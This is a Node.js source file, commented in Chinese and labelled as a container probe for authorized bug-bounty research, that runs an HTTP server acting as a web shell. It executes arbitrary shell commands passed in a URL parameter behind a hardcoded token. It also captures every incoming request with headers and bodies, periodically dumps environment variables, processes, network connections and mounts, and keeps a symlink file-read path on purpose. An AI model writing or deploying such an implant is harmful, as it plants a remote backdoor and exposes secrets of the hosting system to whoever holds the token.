// hostname-probe: 容器内探针服务（授权 SRC 研究用）
// 功能:
//  1. 全量入向请求记录  GET /probe/requests
//  2. 容器内命令执行    GET /probe/exec?k=<TOKEN>&c=<cmd>
//  3. 容器状态周期快照  GET /probe/snapshots   (进程树/出向连接/环境变量/挂载)
//  4. 相邻快照 diff     GET /probe/diff
//  5. 静态服务 dist/    （保留原有 symlink 探针）
const http = require('http');
const fs = require('fs');
const path = require('path');
const { execSync, exec } = require('child_process');

const TOKEN = 'k9x2m7q4w8'; // 访问令牌，部署后可改
const PORT = process.env.PORT || 8081;
const DIST = path.join(__dirname, 'dist');
const BOOT_ID = Math.random().toString(36).slice(2, 10);
const BOOT_AT = new Date().toISOString();

const reqLog = [];   // 入向请求环形缓冲
const snaps = [];    // 状态快照环形缓冲
const MAX = 500;

function push(arr, item) { arr.push(item); if (arr.length > MAX) arr.shift(); }

function sh(cmd) {
  try { return execSync(cmd, { timeout: 8000, encoding: 'utf8', maxBuffer: 1024 * 1024 }); }
  catch (e) { return '[ERR] ' + (e.stdout || '') + (e.stderr || e.message); }
}

// ---- 快照：sidecar 进程、出向连接、env、挂载、主机名 ----
function takeSnapshot(trigger) {
  const s = {
    n: snaps.length, t: new Date().toISOString(), trigger,
    hostname: sh('hostname').trim(),
    ps: sh('ps auxf 2>/dev/null || ps -ef'),
    conns: sh('ss -tnp 2>/dev/null || netstat -tn 2>/dev/null'),
    connsUdp: sh('ss -unp 2>/dev/null'),
    env: sh('env | sort'),
    mounts: sh('cat /proc/mounts 2>/dev/null || mount'),
    resolv: sh('cat /etc/resolv.conf 2>/dev/null'),
  };
  push(snaps, s);
  return s;
}

// ---- 简易 diff（按行集合差异）----
function diffLines(a, b) {
  const A = new Set(a.split('\n')), B = new Set(b.split('\n'));
  return {
    added: [...B].filter(x => x && !A.has(x)),
    removed: [...A].filter(x => x && !B.has(x)),
  };
}

function json(res, obj, code = 200) {
  const body = JSON.stringify(obj, null, 1);
  res.writeHead(code, { 'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*' });
  res.end(body);
}

const MIME = { '.html': 'text/html', '.txt': 'text/plain', '.json': 'application/json' };

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  // 记录一切入向请求（探针端点本身除外）
  if (!u.pathname.startsWith('/probe/')) {
    let body = '';
    req.on('data', c => { if (body.length < 4096) body += c; });
    req.on('end', () => push(reqLog, {
      t: new Date().toISOString(), boot: BOOT_ID,
      m: req.method, url: req.url,
      ip: req.socket.remoteAddress, xff: req.headers['x-forwarded-for'] || null,
      headers: req.headers, body: body.slice(0, 2000),
    }));
  }

  if (u.pathname === '/probe/requests') {
    if (u.searchParams.get('k') !== TOKEN) return json(res, { err: 'bad token' }, 403);
    return json(res, { bootId: BOOT_ID, bootAt: BOOT_AT, count: reqLog.length, requests: reqLog });
  }
  if (u.pathname === '/probe/exec') {
    if (u.searchParams.get('k') !== TOKEN) return json(res, { err: 'bad token' }, 403);
    const c = String(u.searchParams.get('c') || 'id');
    return exec(c, { timeout: 15000, maxBuffer: 2 * 1024 * 1024 }, (e, so, se) => {
      json(res, { cmd: c, code: e ? e.code : 0, stdout: so, stderr: se });
    });
  }
  if (u.pathname === '/probe/snapshots') {
    if (u.searchParams.get('k') !== TOKEN) return json(res, { err: 'bad token' }, 403);
    return json(res, { count: snaps.length, snapshots: snaps });
  }
  if (u.pathname === '/probe/diff') {
    if (u.searchParams.get('k') !== TOKEN) return json(res, { err: 'bad token' }, 403);
    if (snaps.length < 2) return json(res, { err: 'need >=2 snapshots', have: snaps.length });
    const a = snaps[snaps.length - 2], b = snaps[snaps.length - 1];
    return json(res, {
      from: a.t, to: b.t,
      ps: diffLines(a.ps, b.ps), conns: diffLines(a.conns, b.conns),
      env: diffLines(a.env, b.env), mounts: diffLines(a.mounts, b.mounts),
    });
  }
  if (u.pathname === '/probe/snapnow') {
    if (u.searchParams.get('k') !== TOKEN) return json(res, { err: 'bad token' }, 403);
    const s = takeSnapshot('manual');
    return json(res, { ok: true, n: s.n, t: s.t });
  }

  // 静态服务（symlink 原样返回内容，保留原探针语义）
  let p = path.normalize(decodeURIComponent(u.pathname)).replace(/^(\.\.[/\\])+/, '');
  let f = path.join(DIST, p === '/' ? 'index.html' : p);
  fs.readFile(f, (err, data) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('404 logged: ' + req.url + '\n');
    }
    res.writeHead(200, { 'Content-Type': MIME[path.extname(f)] || 'application/octet-stream' });
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`[probe] bootId=${BOOT_ID} port=${PORT} at ${BOOT_AT}`);
  takeSnapshot('boot');
  setInterval(() => takeSnapshot('timer'), 15000);
});
